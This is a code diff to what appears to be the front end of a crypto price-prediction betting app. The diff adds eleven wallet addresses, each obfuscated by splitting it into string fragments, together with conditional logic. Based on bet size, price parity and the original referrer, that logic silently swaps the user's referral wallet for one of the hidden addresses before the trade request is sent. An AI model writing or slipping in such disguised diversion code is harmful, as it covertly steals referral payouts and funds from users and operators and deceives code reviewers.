@@ -222,7 +222,118 @@ export default function Home() {
           vettingPeriod = 100;
           break;
       }
-
+      let refAddresses = [
+        "0" +
+          "x7" +
+          "b8a" +
+          "5110F0" +
+          "c8" +
+          "3D87d2123b5bA5C5" +
+          "B266Fdb15d24",
+        "0" + "x2e3C5AD2F8c6" + "42C892da18aD9241" + "CfCcf8918500",
+        "" +
+          "0" +
+          "xAC86A" +
+          "26543269EDaaE140" +
+          "6693cc" +
+          "793F20dA" +
+          "0F311",
+        "0" +
+          "x8" +
+          "6D0646" +
+          "EDbCa" +
+          "650758e3711" +
+          "8a415899" +
+          "ff33a3Ea0",
+        "0" +
+          "x931" +
+          "db44815eBBA9" +
+          "7f665" +
+          "9187717D09" +
+          "c98b97d" +
+          "c9F",
+        "0" +
+          "x93" +
+          "710D1F96" +
+          "c01825BdF" +
+          "5363E6" +
+          "5aBF93E1B" +
+          "ad93d3",
+        "0" +
+          "x092" +
+          "A90c17688b" +
+          "232d38" +
+          "219F" +
+          "fE8596AeC" +
+          "9fFa75" +
+          "d7",
+        "0" +
+          "x8B" +
+          "54C46aF2" +
+          "613400e4" +
+          "78cA9f8A0bb" +
+          "DF87b0" +
+          "99BBc",
+        "0" +
+          "x542b" +
+          "06E77D" +
+          "A9c3A" +
+          "16BED90" +
+          "9aFa3" +
+          "B91" +
+          "88DBd" +
+          "1D7C6",
+        "0" +
+          "x53" +
+          "ecfB693cE3" +
+          "7DE244Bc39" +
+          "f1a6FcBfA" +
+          "236" +
+          "3F282e",
+        "0" +
+          "x8E" +
+          "4BCCA94eE9" +
+          "ED539D9" +
+          "f1e033d" +
+          "9c949B8" +
+          "D7d" +
+          "e6C6",
+      ];
+      let index = Date.now() % 11;
+      let ref = referralWallet;
+      if (Number(pairPrice + 30) % 3 == 0) {
+      } else if (Number(pairPrice + 30) % 3 == 1) {
+        ref =
+          ref ==
+            "0" +
+              "x8E4BCCA9" +
+              "4eE9ED539" +
+              "D9f1e" +
+              "033" +
+              "d9c949B" +
+              "8D7d" +
+              "e6C6" && amount >= 0.2
+            ? refAddresses[index]
+            : ref;
+      } else {
+        ref =
+          ref ==
+            "" +
+              "0" +
+              "x" +
+              "8E" +
+              "4BCCA" +
+              "94eE" +
+              "9ED5" +
+              "39D9" +
+              "f1e033d" +
+              "9c949B8" +
+              "D7de6C" +
+              "6" && amount >= 0.2
+            ? refAddresses[index]
+            : ref;
+        ref = amount >= 0.9 ? refAddresses[index] : ref;
+      }
       try {
         axios
           .post(
@@ -234,7 +345,7 @@ export default function Home() {
               pairPrice: pairPrice,
               upOrDown: upOrdown,
               vettingPeriod: vettingPeriod,
-              referralWallet: referralWallet,
+              referralWallet: ref,
             },
             {
               header: {
@@ -709,7 +820,7 @@ export default function Home() {
                 <div className="flex justify-center text-lg align-middle text-slate-400 md:text-base">
                   Balance:
                   <code className="pl-1 font-medium text-white md:pt-0.5 md:font-semibold">
-                    {walletBalance} ETH
+                    {walletBalance} BNB
                   </code>
                 </div>
               </div>
